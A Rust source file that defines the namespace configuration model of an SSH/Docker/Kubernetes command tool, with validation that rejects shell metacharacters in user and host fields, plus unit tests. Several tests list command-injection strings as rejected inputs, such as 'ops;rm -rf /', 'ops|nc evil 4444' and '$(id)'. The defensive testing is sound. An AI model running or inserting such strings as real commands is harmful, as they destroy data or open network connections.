//! Namespace data model.

use std::collections::BTreeMap;

use serde::{Deserialize, Serialize};

use crate::error::ConfigError;
use crate::exec::runtime::RuntimeKind;

/// A configured namespace as it appears on disk and after resolution.
///
/// All fields are independently overridable from environment variables (see
/// [`crate::config::env`]). A merged value is represented by
/// [`ResolvedNamespace`].
#[derive(Debug, Clone, Default, Serialize, Deserialize, PartialEq, Eq)]
pub struct NamespaceConfig {
    pub host: Option<String>,
    pub user: Option<String>,
    pub port: Option<u16>,
    pub key_path: Option<String>,
    /// Name of the environment variable holding the key passphrase.
    /// Never store passphrase values themselves on disk.
    pub key_passphrase_env: Option<String>,
    /// Base64-encoded inline private key (env-only, never on disk; this field
    /// is parsed only from environment variables and serialized back out for
    /// `show --json` purposes — never written to `servers.toml`).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub key_inline: Option<String>,
    /// Per-namespace remote environment overlay. Applied
    /// transparently to every `inspect run` / `inspect exec` invocation
    /// against this namespace as `env KEY1="VAL1" KEY2="VAL2" -- <cmd>`.
    /// Values are passed through the remote shell with double-quoting,
    /// so `$HOME`/`$PATH` references on the right-hand side expand on
    /// the remote (intentional: the operator wants the remote user's
    /// home, not the local one). Shell metacharacters (`;`, `&`, `|`,
    /// backticks) are preserved as literal text inside the quoted value.
    /// `None` (the default) means no overlay is applied.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub env: Option<BTreeMap<String, String>>,
    /// Per-namespace opt-out for stale-session
    /// auto-reauth. Default (when `None`) is `true` — every dispatch
    /// that hits a transport-stale failure transparently re-auths
    /// and retries once. Operators who want every session expiry to
    /// surface as a hard failure (e.g. CI runners) set
    /// `auto_reauth = false` in `~/.inspect/servers.toml`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub auto_reauth: Option<bool>,
    /// Per-namespace transcript override. When the
    /// `[namespaces.<ns>.history]` table is present, its fields
    /// override the global defaults: `disabled = true` skips
    /// transcript writes for this namespace entirely (audit log is
    /// still written), `redact = "off"|"normal"|"strict"` overrides
    /// the redaction mode applied to lines tee'd into the
    /// transcript file.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub history: Option<HistoryNsOverride>,
    /// Authentication mode. `Some("key")` (default
    /// when `None`) uses the existing key/agent path; `Some("password")`
    /// switches to interactive / `password_env`-sourced password auth
    /// for legacy boxes and locked-down bastions that do not accept
    /// keys. Any other value is rejected by `validate`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub auth: Option<String>,
    /// Name of the env var holding the SSH password
    /// when `auth = "password"`. Never store the password itself on
    /// disk. Falls back to an interactive prompt when unset.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub password_env: Option<String>,
    /// Per-namespace `ControlPersist` override. Default
    /// is `12h` for password-auth namespaces (vs. the existing 30m
    /// local / 4h codespace defaults for key auth). Capped at `24h`
    /// — `validate` rejects anything longer so a forgotten laptop
    /// doesn't hold a live remote session indefinitely.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub session_ttl: Option<String>,
    /// K2 (v0.1.4): runtime medium selector. Absent or `"docker"`
    /// (the default) is the docker-over-SSH runtime every existing
    /// config uses; `"k8s"` / `"kubernetes"` selects the Kubernetes
    /// runtime (kubectl shell-out). Any other value is rejected by
    /// `validate`. Maps to [`crate::exec::runtime::RuntimeKind`] via
    /// [`NamespaceConfig::runtime_kind`].
    #[serde(rename = "type", default, skip_serializing_if = "Option::is_none")]
    pub runtime_type: Option<String>,
    /// K2 (v0.1.4): path to the kubeconfig for a `type = "k8s"`
    /// namespace. `None` uses kubectl's default resolution
    /// (`$KUBECONFIG` / `~/.kube/config`). Inert for docker namespaces.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub kubeconfig: Option<String>,
    /// K2 (v0.1.4): kubeconfig context to pin on every kubectl call
    /// (the K5 anti-footgun invariant — inspect never reads the ambient
    /// `current-context`). `None` until the operator sets it at `add` /
    /// in `servers.toml`; `setup`/`test` (K6) verify it resolves. Inert
    /// for docker namespaces.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub context: Option<String>,
    /// K2 (v0.1.4): the Kubernetes namespace (inside the cluster) that
    /// this inspect-namespace scopes to. `None` ⇒ kubectl's default
    /// namespace; a per-verb `-n`/`-A` override (K7+) supersedes it.
    /// Serialized as `namespace` in `servers.toml`; named
    /// `k8s_namespace` in code to avoid confusion with the
    /// inspect-namespace itself. Inert for docker namespaces.
    #[serde(rename = "namespace", default, skip_serializing_if = "Option::is_none")]
    pub k8s_namespace: Option<String>,
}

/// Per-namespace transcript policy override. See
/// [`NamespaceConfig::history`].
#[derive(Debug, Clone, Default, Serialize, Deserialize, PartialEq, Eq)]
pub struct HistoryNsOverride {
    /// When `Some(true)`, transcript writes for this namespace are
    /// skipped (the audit log is still written). `None` ⇒ transcript
    /// is enabled (the default).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub disabled: Option<bool>,
    /// Per-namespace transcript redaction mode: `"normal"` (default
    /// — four-masker pipeline), `"strict"` (reserved; identical
    /// to `"normal"` in v0.1.3), `"off"` (write raw lines without
    /// masking). `None` ⇒ inherit the global default.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub redact: Option<String>,
}

impl NamespaceConfig {
    /// Merge `other` over `self`: any field set in `other` takes precedence.
    pub fn merge_over(&self, other: &NamespaceConfig) -> NamespaceConfig {
        // Env overlay merge semantics. When both file
        // and env override carry a map, `other`'s keys win on
        // collision but file-only keys survive. This matches the
        // resolver's general "env over file" idiom (env is a
        // partial overlay, not a replacement).
        let env = match (self.env.as_ref(), other.env.as_ref()) {
            (None, None) => None,
            (Some(a), None) => Some(a.clone()),
            (None, Some(b)) => Some(b.clone()),
            (Some(a), Some(b)) => {
                let mut merged = a.clone();
                for (k, v) in b {
                    merged.insert(k.clone(), v.clone());
                }
                Some(merged)
            }
        };
        NamespaceConfig {
            host: other.host.clone().or_else(|| self.host.clone()),
            user: other.user.clone().or_else(|| self.user.clone()),
            port: other.port.or(self.port),
            key_path: other.key_path.clone().or_else(|| self.key_path.clone()),
            key_passphrase_env: other
                .key_passphrase_env
                .clone()
                .or_else(|| self.key_passphrase_env.clone()),
            key_inline: other.key_inline.clone().or_else(|| self.key_inline.clone()),
            env,
            auto_reauth: other.auto_reauth.or(self.auto_reauth),
            history: other.history.clone().or_else(|| self.history.clone()),
            auth: other.auth.clone().or_else(|| self.auth.clone()),
            password_env: other
                .password_env
                .clone()
                .or_else(|| self.password_env.clone()),
            session_ttl: other
                .session_ttl
                .clone()
                .or_else(|| self.session_ttl.clone()),
            runtime_type: other
                .runtime_type
                .clone()
                .or_else(|| self.runtime_type.clone()),
            kubeconfig: other.kubeconfig.clone().or_else(|| self.kubeconfig.clone()),
            context: other.context.clone().or_else(|| self.context.clone()),
            k8s_namespace: other
                .k8s_namespace
                .clone()
                .or_else(|| self.k8s_namespace.clone()),
        }
    }

    /// The runtime medium this namespace selects, from its `type` field.
    /// Absent / `"docker"` → docker; `"k8s"` / `"kubernetes"` → k8s
    /// (see [`crate::exec::runtime::RuntimeKind::from_type`]). `validate`
    /// rejects any other `type` value, so by the time a resolved config
    /// is dispatched this is an authoritative selection.
    pub fn runtime_kind(&self) -> RuntimeKind {
        RuntimeKind::from_type(self.runtime_type.as_deref())
    }

    /// Validate that required fields are populated and that mutually
    /// exclusive options aren't both set.
    ///
    /// K2 (v0.1.4): validation is **type-conditional**. A docker
    /// namespace keeps the `host` + `user` requirement (and all the SSH
    /// shape / auth / key / ttl checks). A `type = "k8s"` namespace
    /// requires **neither** `host` nor `user` — it is addressed by its
    /// kubeconfig context, whose resolvability is checked at
    /// `setup`/`test` (K6), not here. SSH-only fields on a k8s namespace
    /// are inert (not validated); `show` renders them N/A. An unknown
    /// `type` value is rejected loudly (CI-gate-quality) rather than
    /// silently treated as docker.
    pub fn validate(&self, namespace: &str) -> Result<(), ConfigError> {
        // Reject an unrecognized `type` up front, for both mediums —
        // `RuntimeKind::from_type` is total (unknown → docker) so
        // selection never panics, but a typo like `type = "kube"` must
        // surface here rather than silently running docker.
        if let Some(t) = self.runtime_type.as_deref() {
            let norm = t.trim().to_ascii_lowercase();
            if !matches!(norm.as_str(), "docker" | "k8s" | "kubernetes") {
                return Err(ConfigError::InvalidRuntimeType {
                    namespace: namespace.to_string(),
                    value: t.to_string(),
                });
            }
        }

        // Every env-overlay key must be a POSIX-portable identifier —
        // this check is medium-agnostic, so it runs for both docker and
        // k8s namespaces.
        if let Some(map) = self.env.as_ref() {
            for k in map.keys() {
                if !is_valid_env_key(k) {
                    return Err(ConfigError::InvalidEnvKey {
                        namespace: namespace.to_string(),
                        key: k.clone(),
                    });
                }
            }
        }

        // A k8s namespace needs neither host nor user, and its SSH-only
        // fields (key/auth/password/ttl) are inert. Nothing more to
        // validate here — the context is checked at setup/test (K6).
        if self.runtime_kind() == RuntimeKind::K8s {
            return Ok(());
        }

        // ---- Docker (default) medium: the pre-K2 SSH validation. ----
        if self.host.is_none() {
            return Err(ConfigError::MissingField {
                namespace: namespace.to_string(),
                field: "host",
            });
        }
        if self.user.is_none() {
            return Err(ConfigError::MissingField {
                namespace: namespace.to_string(),
                field: "user",
            });
        }
        // Reject shell metacharacters
        // and whitespace in `user` / `host`. Both are passed to ssh as
        // separate argv entries (so direct command injection isn't
        // possible) but ssh_config `Match exec` blocks expand `%u` /
        // `%h` into shell strings — see CVE-2026-35386. A defense-in-
        // depth shape check at config-parse time is cheaper than
        // proving every ssh_config on every operator's machine is
        // free of `Match exec` blocks that consume those tokens.
        if let Some(u) = self.user.as_deref() {
            if !is_valid_user(u) {
                return Err(ConfigError::InvalidUser {
                    namespace: namespace.to_string(),
                    user: u.to_string(),
                });
            }
        }
        if let Some(h) = self.host.as_deref() {
            if !is_valid_host(h) {
                return Err(ConfigError::InvalidHost {
                    namespace: namespace.to_string(),
                    host: h.to_string(),
                });
            }
        }
        if self.key_path.is_some() && self.key_inline.is_some() {
            return Err(ConfigError::ConflictingKeySources);
        }
        // (env-overlay key validation runs medium-agnostically above.)
        // Auth must be exactly `key` or `password` when
        // set; password_env requires auth=password to make sense;
        // session_ttl must parse and be ≤ 24h.
        if let Some(mode) = self.auth.as_deref() {
            if mode != "key" && mode != "password" {
                return Err(ConfigError::InvalidAuthMode {
                    namespace: namespace.to_string(),
                    value: mode.to_string(),
                });
            }
        }
        if self.password_env.is_some() && self.auth.as_deref() != Some("password") {
            return Err(ConfigError::PasswordEnvWithoutPasswordAuth {
                namespace: namespace.to_string(),
            });
        }
        if let Some(ttl) = self.session_ttl.as_deref() {
            let dur =
                crate::ssh::ttl::parse_ttl(ttl).map_err(|e| ConfigError::InvalidSessionTtl {
                    namespace: namespace.to_string(),
                    value: ttl.to_string(),
                    reason: e.to_string(),
                })?;
            if dur.as_secs() > 24 * 60 * 60 {
                return Err(ConfigError::SessionTtlAboveCap {
                    namespace: namespace.to_string(),
                    value: ttl.to_string(),
                });
            }
        }
        Ok(())
    }
}

/// `[A-Za-z_][A-Za-z0-9_]*`, max 256 chars. Mirrors
/// POSIX 3.231 (Name) which `sh`, `env`, and `printenv` all enforce.
pub fn is_valid_env_key(s: &str) -> bool {
    if s.is_empty() || s.len() > 256 {
        return false;
    }
    let mut chars = s.chars();
    match chars.next() {
        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
        _ => return false,
    }
    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// POSIX-portable login-name shape,
/// `[A-Za-z_][A-Za-z0-9_.-]*`, max 64 chars. Same shape `useradd(8)`
/// enforces by default. Defense-in-depth against ssh_config
/// `Match exec %u` expansion (CVE-2026-35386 family).
pub fn is_valid_user(s: &str) -> bool {
    if s.is_empty() || s.len() > 64 {
        return false;
    }
    let mut chars = s.chars();
    match chars.next() {
        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
        _ => return false,
    }
    chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | '-'))
}

/// IP literal or DNS-shaped name.
/// We are deliberately permissive — `:` for IPv6 literals, `[]` for
/// bracketed IPv6, `.` for IPv4 / DNS, `-` and alnum for DNS labels
/// — and reject anything else. Whitespace, `;`, `&`, `|`, `$`, `\``,
/// `'`, `"`, `(`, `)`, `<`, `>` etc. are out so a hostile value can
/// never be expanded inside an ssh_config `%h` token.
pub fn is_valid_host(s: &str) -> bool {
    if s.is_empty() || s.len() > 255 {
        return false;
    }
    s.chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | ':' | '[' | ']' | '_'))
}

/// Where a namespace was sourced from after merging.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum NamespaceSource {
    /// Defined entirely from `INSPECT_<NS>_*` env vars (no file entry).
    EnvOnly,
    /// Defined entirely from the on-disk file (no env override).
    FileOnly,
    /// File-defined but at least one field was overridden by env vars.
    EnvOverFile,
}

/// A namespace whose values have been merged across env + file.
#[derive(Debug, Clone)]
pub struct ResolvedNamespace {
    pub name: String,
    pub config: NamespaceConfig,
    pub source: NamespaceSource,
}

/// Validate namespace short names. Lowercase, digits, dash, underscore.
/// Must start with a letter or digit. Max 63 chars.
pub fn validate_namespace_name(name: &str) -> Result<(), ConfigError> {
    use std::sync::OnceLock;

    use regex::Regex;
    static RE: OnceLock<Regex> = OnceLock::new();
    let re = RE.get_or_init(|| Regex::new(r"^[a-z0-9][a-z0-9_-]{0,62}$").expect("valid regex"));
    if !re.is_match(name) {
        return Err(ConfigError::InvalidNamespaceName(name.to_string()));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cfg(host: Option<&str>, user: Option<&str>, port: Option<u16>) -> NamespaceConfig {
        NamespaceConfig {
            host: host.map(String::from),
            user: user.map(String::from),
            port,
            key_path: None,
            key_passphrase_env: None,
            key_inline: None,
            env: None,
            auto_reauth: None,
            history: None,
            auth: None,
            password_env: None,
            session_ttl: None,
            runtime_type: None,
            kubeconfig: None,
            context: None,
            k8s_namespace: None,
        }
    }

    /// Build a `type = "k8s"` namespace config with no host/user.
    fn k8s_cfg(context: Option<&str>, k8s_ns: Option<&str>) -> NamespaceConfig {
        NamespaceConfig {
            runtime_type: Some("k8s".into()),
            context: context.map(String::from),
            k8s_namespace: k8s_ns.map(String::from),
            ..Default::default()
        }
    }

    #[test]
    fn merge_env_over_file() {
        let file = cfg(Some("file.example"), Some("fileuser"), Some(22));
        let env = cfg(Some("env.example"), None, None);
        let merged = file.merge_over(&env);
        assert_eq!(merged.host.as_deref(), Some("env.example"));
        assert_eq!(merged.user.as_deref(), Some("fileuser"));
        assert_eq!(merged.port, Some(22));
    }

    #[test]
    fn validate_requires_host_and_user() {
        let mut c = cfg(None, Some("u"), None);
        c.key_path = Some("/tmp/k".into());
        assert!(c.validate("ns").is_err());

        let mut c = cfg(Some("h"), None, None);
        c.key_path = Some("/tmp/k".into());
        assert!(c.validate("ns").is_err());

        let mut c = cfg(Some("h"), Some("u"), None);
        c.key_path = Some("/tmp/k".into());
        assert!(c.validate("ns").is_ok());
    }

    #[test]
    fn validate_rejects_conflicting_key_sources() {
        let mut c = cfg(Some("h"), Some("u"), None);
        c.key_path = Some("/tmp/k".into());
        c.key_inline = Some("base64==".into());
        assert!(matches!(
            c.validate("ns"),
            Err(ConfigError::ConflictingKeySources)
        ));
    }

    #[test]
    fn namespace_name_validation() {
        assert!(validate_namespace_name("arte").is_ok());
        assert!(validate_namespace_name("prod-eu").is_ok());
        assert!(validate_namespace_name("a1_2-3").is_ok());
        assert!(validate_namespace_name("Arte").is_err());
        assert!(validate_namespace_name("").is_err());
        assert!(validate_namespace_name("-bad").is_err());
        assert!(validate_namespace_name("bad name").is_err());
    }

    // ---- user / host shape (post-v0.1.3 security audit) -------------------

    #[test]
    fn s4_user_shape_accepts_posix_login_names() {
        assert!(is_valid_user("ops"));
        assert!(is_valid_user("deploy_bot"));
        assert!(is_valid_user("svc.app"));
        assert!(is_valid_user("user-1"));
        assert!(is_valid_user("_internal"));
    }

    #[test]
    fn s4_user_shape_rejects_shell_metacharacters() {
        // Every char from the classic command-injection ladder.
        for bad in [
            "ops;rm -rf /",
            "ops$(id)",
            "ops`id`",
            "ops|nc evil 4444",
            "ops&disown",
            "ops>/etc/passwd",
            "ops<input",
            "'ops'",
            "\"ops\"",
            "(ops)",
            "ops with space",
            "ops\nnewline",
            "ops\\backslash",
            "ops!bang",
            "ops*glob",
            "ops?glob",
            "ops#hash",
            "",
        ] {
            assert!(!is_valid_user(bad), "should reject: {bad:?}");
        }
    }

    #[test]
    fn s4_host_shape_accepts_dns_and_ip_literals() {
        assert!(is_valid_host("example.com"));
        assert!(is_valid_host("db-prod-01.internal"));
        assert!(is_valid_host("10.0.0.5"));
        assert!(is_valid_host("[2001:db8::1]"));
        assert!(is_valid_host("fe80::1"));
        assert!(is_valid_host("localhost"));
    }

    #[test]
    fn s4_host_shape_rejects_shell_metacharacters() {
        for bad in [
            "host;evil",
            "host$(id)",
            "host`id`",
            "host with space",
            "host|pipe",
            "host&background",
            "host>file",
            "'host'",
            "host\nnewline",
            "",
        ] {
            assert!(!is_valid_host(bad), "should reject: {bad:?}");
        }
    }

    #[test]
    fn s4_validate_rejects_hostile_user() {
        let mut c = cfg(Some("h"), Some("ops;rm -rf /"), None);
        c.key_path = Some("/tmp/k".into());
        assert!(matches!(
            c.validate("ns"),
            Err(ConfigError::InvalidUser { .. })
        ));
    }

    #[test]
    fn s4_validate_rejects_hostile_host() {
        let mut c = cfg(Some("$(id)"), Some("ops"), None);
        c.key_path = Some("/tmp/k".into());
        assert!(matches!(
            c.validate("ns"),
            Err(ConfigError::InvalidHost { .. })
        ));
    }

    // ---- : auth / password_env / session_ttl --------------------

    #[test]
    fn l4_auth_mode_defaults_to_key_when_unset() {
        let c = cfg(Some("h"), Some("u"), None);
        assert!(c.validate("ns").is_ok());
        assert!(c.auth.is_none()); // None ⇒ "key" semantically; resolver/connect path handles the default.
    }

    #[test]
    fn l4_auth_mode_accepts_key_and_password() {
        for v in ["key", "password"] {
            let mut c = cfg(Some("h"), Some("u"), None);
            c.auth = Some(v.into());
            assert!(c.validate("ns").is_ok(), "expected '{v}' to validate");
        }
    }

    #[test]
    fn l4_auth_mode_rejects_unknown() {
        let mut c = cfg(Some("h"), Some("u"), None);
        c.auth = Some("kerberos".into());
        assert!(matches!(
            c.validate("ns"),
            Err(ConfigError::InvalidAuthMode { value, .. }) if value == "kerberos"
        ));
    }

    #[test]
    fn l4_password_env_requires_password_auth() {
        let mut c = cfg(Some("h"), Some("u"), None);
        c.password_env = Some("LEGACY_BOX_PASS".into());
        // No auth set ⇒ rejected.
        assert!(matches!(
            c.validate("ns"),
            Err(ConfigError::PasswordEnvWithoutPasswordAuth { .. })
        ));
        // auth=key ⇒ rejected (password_env makes no sense for key auth).
        c.auth = Some("key".into());
        assert!(matches!(
            c.validate("ns"),
            Err(ConfigError::PasswordEnvWithoutPasswordAuth { .. })
        ));
        // auth=password ⇒ accepted.
        c.auth = Some("password".into());
        assert!(c.validate("ns").is_ok());
    }

    #[test]
    fn l4_session_ttl_accepts_well_formed_durations() {
        for v in ["30m", "1h", "12h", "23h", "24h", "1440m", "86400s"] {
            let mut c = cfg(Some("h"), Some("u"), None);
            c.session_ttl = Some(v.into());
            assert!(c.validate("ns").is_ok(), "expected '{v}' to validate");
        }
    }

    #[test]
    fn l4_session_ttl_rejects_garbage() {
        let mut c = cfg(Some("h"), Some("u"), None);
        c.session_ttl = Some("forever".into());
        assert!(matches!(
            c.validate("ns"),
            Err(ConfigError::InvalidSessionTtl { value, .. }) if value == "forever"
        ));
    }

    #[test]
    fn l4_session_ttl_caps_at_24h() {
        for v in ["48h", "25h", "2d", "1500m", "86401s"] {
            let mut c = cfg(Some("h"), Some("u"), None);
            c.session_ttl = Some(v.into());
            assert!(
                matches!(
                    c.validate("ns"),
                    Err(ConfigError::SessionTtlAboveCap { value, .. }) if value == v
                ),
                "expected '{v}' to be rejected by 24h cap"
            );
        }
    }

    #[test]
    fn l4_merge_preserves_l4_fields() {
        let mut file = cfg(Some("h"), Some("u"), None);
        file.auth = Some("password".into());
        file.password_env = Some("LEGACY_BOX_PASS".into());
        file.session_ttl = Some("12h".into());
        let env = cfg(Some("h"), Some("u"), None);
        let merged = file.merge_over(&env);
        assert_eq!(merged.auth.as_deref(), Some("password"));
        assert_eq!(merged.password_env.as_deref(), Some("LEGACY_BOX_PASS"));
        assert_eq!(merged.session_ttl.as_deref(), Some("12h"));
    }

    #[test]
    fn l4_env_overrides_l4_fields() {
        let mut file = cfg(Some("h"), Some("u"), None);
        file.auth = Some("key".into());
        file.session_ttl = Some("4h".into());
        let mut env = cfg(Some("h"), Some("u"), None);
        env.auth = Some("password".into());
        env.password_env = Some("ENV_PASS".into());
        env.session_ttl = Some("12h".into());
        let merged = file.merge_over(&env);
        assert_eq!(merged.auth.as_deref(), Some("password"));
        assert_eq!(merged.password_env.as_deref(), Some("ENV_PASS"));
        assert_eq!(merged.session_ttl.as_deref(), Some("12h"));
    }

    // ---- K2 (v0.1.4): kubernetes namespace config -----------------------

    #[test]
    fn k2_k8s_namespace_parses_without_host_user() {
        // A k8s namespace validates with neither host nor user — it is
        // addressed by its kubeconfig context (checked at setup/test, K6).
        let c = k8s_cfg(Some("staging"), Some("default"));
        assert!(c.host.is_none() && c.user.is_none());
        assert!(c.validate("staging-k8s").is_ok());
        assert_eq!(c.runtime_kind(), RuntimeKind::K8s);
    }

    #[test]
    fn k2_docker_namespace_still_requires_host_user() {
        // Absent `type` ⇒ docker ⇒ the pre-K2 host+user requirement holds.
        let missing_user = cfg(Some("h"), None, None);
        assert!(matches!(
            missing_user.validate("ns"),
            Err(ConfigError::MissingField { field: "user", .. })
        ));
        let missing_host = cfg(None, Some("u"), None);
        assert!(matches!(
            missing_host.validate("ns"),
            Err(ConfigError::MissingField { field: "host", .. })
        ));
        // An explicit `type = "docker"` keeps the same requirement.
        let mut typed_docker = cfg(None, None, None);
        typed_docker.runtime_type = Some("docker".into());
        assert!(typed_docker.validate("ns").is_err());
    }

    #[test]
    fn k2_type_defaults_to_docker_when_absent() {
        let c = cfg(Some("h"), Some("u"), None);
        assert!(c.runtime_type.is_none());
        assert_eq!(c.runtime_kind(), RuntimeKind::Docker);
        // "kubernetes" is an accepted alias for k8s.
        let mut alias = k8s_cfg(None, None);
        alias.runtime_type = Some("kubernetes".into());
        assert_eq!(alias.runtime_kind(), RuntimeKind::K8s);
    }

    #[test]
    fn k2_rejects_unknown_runtime_type() {
        // A typo'd `type` must surface loudly, not silently run docker.
        let mut c = k8s_cfg(None, None);
        c.runtime_type = Some("kube".into());
        assert!(matches!(
            c.validate("ns"),
            Err(ConfigError::InvalidRuntimeType { value, .. }) if value == "kube"
        ));
    }

    #[test]
    fn k2_k8s_ssh_fields_inert_but_env_keys_still_validated() {
        // SSH-only fields set on a k8s namespace are inert (no error) …
        let mut c = k8s_cfg(Some("ctx"), None);
        c.auth = Some("password".into());
        c.session_ttl = Some("999h".into()); // would fail the 24h cap on docker
        c.key_path = Some("/tmp/k".into());
        c.key_inline = Some("base64==".into()); // would conflict on docker
        assert!(c.validate("staging-k8s").is_ok());
        // … but the medium-agnostic env-key check still fires.
        let mut bad_env = k8s_cfg(Some("ctx"), None);
        let mut env = BTreeMap::new();
        env.insert("BAD-KEY".to_string(), "v".to_string());
        bad_env.env = Some(env);
        assert!(matches!(
            bad_env.validate("staging-k8s"),
            Err(ConfigError::InvalidEnvKey { .. })
        ));
    }

    #[test]
    fn k2_merge_preserves_k8s_fields() {
        let file = k8s_cfg(Some("staging"), Some("default"));
        let env = NamespaceConfig::default();
        let merged = file.merge_over(&env);
        assert_eq!(merged.runtime_type.as_deref(), Some("k8s"));
        assert_eq!(merged.context.as_deref(), Some("staging"));
        assert_eq!(merged.k8s_namespace.as_deref(), Some("default"));
        // env override wins on collision.
        let mut env2 = NamespaceConfig::default();
        env2.context = Some("prod".into());
        let merged2 = file.merge_over(&env2);
        assert_eq!(merged2.context.as_deref(), Some("prod"));
    }
}
